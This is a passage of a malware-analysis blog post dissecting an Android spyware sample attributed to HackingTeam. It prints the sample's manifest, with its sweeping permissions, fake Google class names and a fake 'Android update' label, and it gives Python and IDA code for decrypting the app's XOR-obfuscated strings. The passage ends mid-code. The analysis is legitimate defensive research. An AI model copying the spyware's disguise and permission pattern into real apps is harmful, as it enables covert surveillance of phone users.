class="attr">android:name</span>=<span class="string">"android.permission.READ_SMS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.SEND_SMS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.RECEIVE_SMS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.RECEIVE_MMS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.RECEIVE_BOOT_COMPLETED"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"com.android.launcher.permission.INSTALL_SHORTCUT"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"com.android.launcher.permission.UNINSTALL_SHORTCUT"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_MOCK_LOCATION"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.AUTHENTICATE_ACCOUNTS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.BATTERY_STATS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.BLUETOOTH"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.BLUETOOTH_ADMIN"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.BROADCAST_STICKY"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CHANGE_CONFIGURATION"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.CHANGE_WIFI_MULTICAST_STATE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.GET_ACCOUNTS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.GET_PACKAGE_SIZE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.GET_TASKS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.KILL_BACKGROUND_PROCESSES"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.MANAGE_ACCOUNTS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.MODIFY_AUDIO_SETTINGS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.NFC"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.PERSISTENT_ACTIVITY"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_CALENDAR"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_SOCIAL_STREAM"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_SYNC_SETTINGS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_SYNC_STATS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_USER_DICTIONARY"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"com.android.browser.permission.READ_HISTORY_BOOKMARKS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.RESTART_PACKAGES"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.SET_ALWAYS_FINISH"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.SUBSCRIBED_FEEDS_READ"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.SET_ANIMATION_SCALE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.SET_PROCESS_LIMIT"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.SET_WALLPAPER"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.SET_WALLPAPER_HINTS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.SIGNAL_PERSISTENT_PROCESSES"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.USE_CREDENTIALS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.USE_SIP"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_CALL_LOG"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_SMS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_CALENDAR"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_CONTACTS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_PROFILE"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_SETTINGS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_SOCIAL_STREAM"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_SYNC_SETTINGS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_USER_DICTIONARY"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.SYSTEM_ALERT_WINDOW"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.PROCESS_OUTGOING_CALLS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.BROADCAST_SMS"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.BROADCAST_WAP_PUSH"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">"@android:0103000C"</span> <span class="attr">android:label</span>=<span class="string">"Vodafone APN"</span> <span class="attr">android:icon</span>=<span class="string">"@7F020000"</span> <span class="attr">android:allowBackup</span>=<span class="string">"true"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:label</span>=<span class="string">"Phone Service"</span> <span class="attr">android:name</span>=<span class="string">"com.google.android.MainService"</span> <span class="attr">android:exported</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:label</span>=<span class="string">"System Service"</span> <span class="attr">android:name</span>=<span class="string">"com.package._p"</span> <span class="attr">android:exported</span>=<span class="string">"false"</span>/&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">"com.google.android.Autostart"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.BOOT_COMPLETED"</span>/&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">"com.google.android.PackageChangeReceiver"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.PACKAGE_ADDED"</span>/&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.PACKAGE_REPLACED"</span>/&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.PACKAGE_REMOVED"</span>/&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">"package"</span>/&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:theme</span>=<span class="string">"@android:01030011"</span> <span class="attr">android:label</span>=<span class="string">"Aggiornamento Android"</span> <span class="attr">android:name</span>=<span class="string">"com.google.android.system.MainActivity"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span>/&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span>/&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:theme</span>=<span class="string">"@android:01030011"</span> <span class="attr">android:label</span>=<span class="string">"RecActivity"</span> <span class="attr">android:name</span>=<span class="string">"com.google.android.system.RecActivity"</span>/&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:theme</span>=<span class="string">"@android:01030011"</span> <span class="attr">android:label</span>=<span class="string">"SupportActivity"</span> <span class="attr">android:name</span>=<span class="string">"com.google.android.system.SupportActivity"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></div></pre></td></tr></table></figure>
<p>There are a few tidbits from the manifest which strike me as interesting right away, other than the inordinate amount of permissions being requested. First, the package name <code>it.phonevoda.androidv1</code> seems interesting as many legitimate apps start with the default <code>com.</code> prefix. Honestly, this could be nothing or it could be attempting to look like a something to do with Vodaphone Italy. I’ve never personally seen anything from an Italian specific phone. However the structure doesn’t ring any bells.</p>
<p>It’s also interesting to note that the package name does not match the class paths of the activities, services and receivers do not match up with this package name. For example, there is a service with the namespace <code>com.google.android.MainService</code> which sounds like it’s trying too hard to look like an official package Android package. Another service has the namespace <code>com.package._p</code> and is just simple a <code>System Service</code>. The MainActivity is <code>com.google.android.system.MainActivity</code> but is also labeled <code>Aggiornamento Android</code> which is Italian for <code>Updating Android</code>. Sounds legit.</p>
<p><img src="/images/hackingteam_back_for_your_androids/Jon-Hamm-Sure-Thing.gif" alt=""></p>
<p>To sum it up, we have an app requesting almost every permission possible, claims to be an Android update, and purports to have something to do with Vodaphone APNs. These all seem… Normal, right? Yea, not really…</p>
<h3 id="String-Encryption"><a href="#String-Encryption" class="headerlink" title="String Encryption"></a><a name="String-Encryption"></a>String Encryption</h3><p>Throwing the DEX file into IDA Pro and looking at a <code>MainService.onCreate()</code>, we immediately see something somewhat interesting;</p>
<p><img src="/images/hackingteam_back_for_your_androids/encrypted_mainservice.png" alt=""></p>
<p>This clearly shows an encrypted / obfuscated string. Looking at the Strings tab, we see many more obfuscated strings.</p>
<p><img src="/images/hackingteam_back_for_your_androids/encrypted_strings.png" alt=""></p>
<p>As we back out to <code>onCreate()</code>, we can see that the string decryption method is likely <code>String com.google.gson.JsonNull.startsWith(String, int)</code>. Oh, that is <em>cute</em>. They’re attempting to hide their method signatures in plain sight by giving them legitimate looking names. Maybe this is to avoid “easy” signatures since a signature on this method name may false positive? Or maybe this is just a simple attempt to make a reverser’s life a bit harder.</p>
<p>The decryption method itself is actually quite easy to reverse:</p>
<p><img src="/images/hackingteam_back_for_your_androids/func_jsonnull.png" alt=""></p>
<p>It’s just a a modified <a href="https://en.wikipedia.org/wiki/XOR_cipher" target="_blank" rel="external">XOR cipher</a> with a modifier being passed in as an argument. Translated to Python:</p>
<figure class="highlight python"><figcaption><span>xor.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted, mod)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> encrypted <span class="keyword">or</span> <span class="keyword">not</span> mod:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span></div><div class="line"></div><div class="line">    mod = mod - <span class="number">0x5</span></div><div class="line">    out = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> list(encrypted):</div><div class="line">        out = <span class="string">'%s%s'</span> % (out, unichr(ord(char) ^ (mod &amp; <span class="number">0x5F</span>)))</div><div class="line">        mod = (mod - <span class="number">0xB</span>)</div><div class="line"></div><div class="line">    <span class="keyword">return</span> out.encode(<span class="string">'ascii'</span>, <span class="string">'replace'</span>).encode(<span class="string">'UTF-32'</span>)</div></pre></td></tr></table></figure>
<h3 id="Decrypting-Strings-with-IDA"><a href="#Decrypting-Strings-with-IDA" class="headerlink" title="Decrypting Strings with IDA"></a><a name="Decrypting-the-Strings"></a>Decrypting Strings with IDA</h3><p>I wanted to dump all of decrypted strings to a file and also inline them as comments where they were being used. The <code>decryptor.py</code> IDA plugin below works by looking in the Dalvik code for the opcodes <code>const-string</code> paired with <code>const/16</code> to get the encrypted string and XOR cipher mod argument. Then, it looks for the <code>invoke-static</code> opcode with the method <code>JsonNull.startsWith()</code>. If this pattern is matched we can pass the arguments into our reversed decryption method to get the decrypted string. Finally, this string is added as a comment near the encrypted string. The processes reuses some of the code for adding load strings for Go files described in a <a href="http://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro/">previous blog post</a>.</p>
<p>It turned out there was more than just the <code>JsonNull.startsWith()</code> decryption method. I saw the literal values of <code>-0x5</code> and <code>-0xB</code> change between the decryption methods. To support these other methods, I moved these out of the code and into the <code>mod1</code> and <code>mod2</code> arguments.</p>
<p>Please note that the way this code loads strings from the string table is annoying. After messaging IDA support about why it was so difficult, they informed me that there was a better way. Apparently, I should have used the <a href="https://www.hex-rays.com/products/ida/support/idadoc/1218.shtml" target="_blank" rel="external"><code>DecodeInstruction</code></a> function. I’ll likely try to rework this code later to use this.</p>
<p>After a bit of movie magic, we end up with the code below.</p>
<figure class="highlight python"><figcaption><span>decryptor.py</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div></pre></td><td class="code"><pre><div class="line"><span class="string">"""decryptor.py: Automate some types of Dalvik string decryption."""</span></div><div class="line"></div><div class="line">__author__ = <span class="string">"Tim 'diff' Strazzere"</span></div><div class="line">__copyright__ = <span class="string">"Copyright 2016, Red Naga"</span></div><div class="line">__license__ = <span class="string">"GPL"</span></div><div class="line">__version__ = <span class="string">"1.0"</span></div><div class="line">__email__ = [<span class="string">"strazz@gmail.com"</span>]</div><div class="line"></div><div class="line"><span class="keyword">from</span> idautils <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> idaapi</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Constants</span></div><div class="line"><span class="comment">#</span></div><div class="line">DEBUG = <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment"># Utility functions</span></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(formatted_string)</span>:</span></div><div class="line">    <span class="keyword">print</span> formatted_string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">error</span><span class="params">(formatted_string)</span>:</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'ERROR - %s'</span> % formatted_string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(formatted_string)</span>:</span></div><div class="line">    <span class="keyword">if</span> DEBUG:</div><div class="line">        <span class="keyword">print</span> <span class="string">'DEBUG - %s'</span> % formatted_string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">readShort</span><span class="params">(addr)</span>:</span></div><div class="line">    <span class="keyword">return</span> (GetOriginalByte(addr + <span class="number">0x1</span>) &lt;&lt; <span class="number">0x8</span>) + GetOriginalByte(addr)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">readInt</span><span class="params">(addr)</span>:</span></div><div class="line">    <span class="keyword">return</span> (GetOriginalByte(addr + <span class="number">0x3</span>) &lt;&lt; <span class="number">0x18</span>) + (GetOriginalByte(addr + <span class="number">0x2</span>) &lt;&lt; <span class="number">0x10</span>) + (GetOriginalByte(addr + <span class="number">0x1</span>) &lt;&lt; <span class="number">0x8</span>) + GetOriginalByte(addr)</div><div class="line"></div><div class="line"><span class="comment"># Todo this will only accept strings of lenght 0xFF</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getStringFromAddr</span><span class="params">(addr)</span>:</span></div><div class="line">    length = GetOriginalByte(addr)</div><div class="line">    string = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length + <span class="number">1</span>):</div><div class="line">        string = <span class="string">'%s%c'</span> % (string, unichr(GetOriginalByte(addr + i)))</div><div class="line"></div><div class="line">    <span class="keyword">return</span> string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getString</span><span class="params">(addr)</span>:</span></div><div class="line">    string_id = readShort(addr + <span class="number">0x2</span>) <span class="comment"># (GetOriginalByte(addr + 0x3) &lt;&lt; 0x8) + GetOriginalByte(addr + 0x2)</span></div><div class="line">    string_ids = ida_segment.get_segm_by_name(<span class="string">'STR_IDS'</span>)</div><div class="line">    string_addr = readInt(string_ids.startEA + (string_id * <span class="number">4</span>))</div><div class="line"></div><div class="line">    <span class="keyword">return</span> getStringFromAddr(string_addr)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generic_decrypt</span><span class="params">(encrypted, mod, static_xor, mod_add_1, mod_add_2)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> encrypted <span class="keyword">or</span> <span class="keyword">not</span> mod:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span></div><div class="line"></div><div class="line">    mod = mod + mod_add_1</div><div class="line">    out = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> list(encrypted):</div><div class="line">        out = <span class="string">'%s%s'</span> % (out, unichr(ord(char) ^ (mod &amp; static_xor)))</div><div class="line">        mod = (mod + mod_add_2)</div><div class="line"></div><div class="line">    <span class="comment"># MakeComm and MakeRptCmt barf if we don't convert this to non-unicode, unknown if this will cause issues downstream...</span></div><div class="line">    <span class="keyword">return</span> out.encode(<span class="string">'ascii'</span>, <span class="string">'replace'</span>)<span class="comment">#.encode('UTF-32')</span></div><div class="line"></div><div class="line">cryptions = [</div><div class="line"><span class="comment"># v 7.0.0 obf</span></div><div class="line">    [ <span class="string">'Gson.equals(ref, int)'</span>, <span class="number">0x5F</span>, <span class="number">-0xC</span>, <span class="number">0x3</span> ],</div><div class="line">    [ <span class="string">'g9.concat(int, ref)'</span>, <span class="number">0x5F</span>, <span class="number">0xB</span>, <span class="number">-0xB</span> ],</div><div class="line">    [ <span class="string">'Autostart.regionMatches(int, ref)'</span>, <span class="number">0x5F</span>, <span class="number">0xE</span>, <span class="number">-0xB</span> ],</div><div class="line">    [ <span class="string">'f.replace(ref, int)'</span>, <span class="number">0x5F</span>, <span class="number">0xD</span>, <span class="number">0xB</span> ],</div><div class="line">    [ <span class="string">'h.equals(ref, int)'</span>, <span class="number">0x5F</span>, <span class="number">0xC</span>, <span class="number">0x9</span> ],</div><div class="line">    [ <span class="string">'a.toString(int, ref)'</span>, <span class="number">0x5F</span>, <span class="number">-0xB</span>, <span class="number">-0x1</span> ],</div><div class="line"><span class="comment"># Earlier samples - v 4.0 obf</span></div><div class="line">    [ <span class="string">'Gson.getChars(ref, int)'</span>, <span class="number">0x5F</span>, <span class="number">0x7</span>, <span class="number">0xD</span> ],</div><div class="line">    [ <span class="string">'JsonNull.split(int, ref)'</span>, <span class="number">0x5F</span>, <span class="number">0x8</span>, <span class="number">0xF</span> ],</div><div class="line"><span class="comment"># v 4.0 obf</span></div><div class="line">    [ <span class="string">'JsonNull.concat(int, ref)'</span>, <span class="number">0x5F</span>, <span class="number">-0x7</span>, <span class="number">0x9</span> ],</div><div class="line">    [ <span class="string">'Gson.indexOf(ref, int)'</span>, <span class="number">0x5F</span>, <span class="number">0x3</span>, <span class="number">-0xD</span> ],</div><div class="line"><span class="comment"># v 6.1.0 obf - tre</span></div><div class="line">    [ <span class="string">'li.valueOf(int, ref)'</span>, <span class="number">0x5F</span>, <span class="number">0xF</span>, <span class="number">-0x1</span> ],</div><div class="line">    [ <span class="string">'Gson.concat(ref, int)'</span>, <span class="number">0x5f</span>, <span class="number">-0x1</span>, <span class="number">0x1</span> ],</div><div class="line"><span class="comment"># Zed detect sample - v 6.1.0 obf - bulk</span></div><div class="line"><span class="comment">#    [ 'Gson.indexOf(ref, int)', 0x5F, 0x5, -0x9 ],</span></div><div class="line">    [ <span class="string">'JsonNull.startsWith(int, ref)'</span>, <span class="number">0x5F</span>, <span class="number">-0x5</span>, <span class="number">-0xB</span> ],</div><div class="line">]</div><div class="line"></div><div class="line">cryptions_3arg = [</div><div class="line">    [ <span class="string">'e.getChars(ref, int, int)'</span>, <span class="number">0x5F</span>, <span class="number">-0xF</span> ],</div><div class="line">]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_encrypted</span><span class="params">(addr)</span>:</span></div><div class="line">    <span class="keyword">if</span> GetMnem(addr) == <span class="string">'const-string'</span>:</div><div class="line">        addr_2 = FindCode(addr, SEARCH_DOWN)</div><div class="line">        <span class="keyword">if</span> <span class="string">'const/'</span> <span class="keyword">in</span> GetMnem(addr_2):</div><div class="line">            addr_3 = FindCode(addr_2, SEARCH_DOWN)</div><div class="line">            <span class="keyword">if</span> GetMnem(addr_3) == <span class="string">'invoke-static'</span>:</div><div class="line">                <span class="keyword">for</span> (func, xor, mod1, mod2) <span class="keyword">in</span> cryptions:</div><div class="line">                    <span class="keyword">if</span> func <span class="keyword">in</span> GetOpnd(addr_3, <span class="number">2</span>):</div><div class="line">                        debug(<span class="string">' %s in %s '</span> % (func, GetOpnd(addr_3, <span class="number">2</span>)))</div><div class="line">                        <span class="comment"># GetOpnd(addr, 2) will just return the string name, so, we're screwed and need to calculate it by hand</span></div><div class="line">                        <span class="comment"># This is done by getting the string_id offset, then looking it up in the STR_ID table...</span></div><div class="line">                        loaded_string = getString(addr)</div><div class="line">                        <span class="comment"># Should always work, it will guess that it's base16 and chop off the expected '0x' prefix</span></div><div class="line">                        modifier = int(GetOpnd(addr_2, <span class="number">1</span>), <span class="number">0</span>)</div><div class="line">                        info(<span class="string">'0x%x : %s : %s'</span> % (addr, loaded_string, generic_decrypt(loaded_string, modifier, xor, mod1, mod2)))</div><div class="line">                        MakeComm(addr, generic_decrypt(loaded_string, modifier, xor, mod1, mod2))</div><div class="line">                        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">            <span class="keyword">elif</span> <span class="string">'const/'</span> <span class="keyword">in</span> GetMnem(addr_3):</div><div class="line">                addr_4 = FindCode(addr_3, SEARCH_DOWN)</div><div class="line">                <span class="keyword">if</span> GetMnem(addr_4) == <span class="string">'invoke-static'</span>:</div><div class="line">                    <span class="keyword">for</span> (func, xor, mod1) <span class="keyword">in</span> cryptions_3arg:</div><div class="line">                        <span class="keyword">if</span> func <span class="keyword">in</span> GetOpnd(addr_4, <span class="number">3</span>):</div><div class="line">                            debug(<span class="string">' %s in %s '</span> % (func, GetOpnd(addr_4, <span class="number">3</span>)))</div><div class="line">                            